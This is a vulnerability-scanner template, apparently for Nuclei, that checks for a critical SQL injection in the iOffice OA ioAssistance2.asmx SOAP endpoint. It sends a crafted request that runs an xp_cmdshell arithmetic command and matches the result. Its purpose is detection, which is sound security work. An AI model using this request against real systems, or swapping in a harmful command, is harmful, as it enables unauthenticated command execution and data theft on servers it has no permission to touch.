folder-1/CVD-2023-1215.yaml

id: ioffice-ioassistance-sql-injection
info:
  name: iOffice OA ioAssistance2.asmx SQL Injection
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Hongfan OA ioAssistance2.asmx contains a SQL injection vulnerability allowing attackers to execute arbitrary SQL commands or obtain sensitive data.
  reference:
    - http://www.ioffice.cn/
  classification:
    cvss-metrics: '3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H'
    cvss-score: 9.8
  tags: sql-injection

variables:
  randNum1: "{{rand_int(100000, 110000)}}"
  randNum2: "{{rand_int(50000, 60000)}}"
  sum: "{{to_number(randNum1) + to_number(randNum2)}}"

http:
  - raw:
      - |
        POST /ioffice/prg/set/wss/ioAssistance2.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        Soapaction: "http://tempuri.org/GetLoginedEmpNoReadedInf"

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetLoginedEmpNoReadedInf xmlns="http://tempuri.org/">
              <sql>exec master.dbo.xp_cmdshell 'set /a {{randNum1}} + {{randNum2}}'</sql>
            </GetLoginedEmpNoReadedInf>
          </soap:Body>
        </soap:Envelope>
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "<output>"
      - type: regex
        regex:
          - "{{sum}}"
